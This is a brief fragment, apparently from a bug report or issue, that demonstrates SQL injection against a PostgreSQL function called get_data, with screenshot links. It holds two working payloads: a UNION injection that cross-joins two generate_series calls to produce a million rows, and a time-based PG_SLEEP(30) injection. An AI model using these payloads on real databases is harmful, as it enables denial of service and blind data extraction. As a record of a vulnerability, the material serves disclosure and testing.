SELECT * FROM get_data('1'' UNION
(SELECT p1, CAST(p1 AS VARCHAR), CAST(p1 AS INTEGER)
FROM (SELECT generate_series p1 FROM generate_series (1,1000)) t1
CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- ');

<img width="565" alt="2-2-5-1" src="https://user-images.githubusercontent.com/55449630/206283862-6858632d-d0a3-438a-95ca-299f549c60ca.png">

SELECT * FROM get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) -- ');

<img width="570" alt="image" src="https://user-images.githubusercontent.com/27497026/210150314-a17cc3d5-95fa-4c84-8df6-3a70e30ce70b.png">

After 30 seconds:

<img width="566" alt="image" src="https://user-images.githubusercontent.com/27497026/210150344-c9bf3ead-514b-4d14-a622-eb0cad5304c3.png">
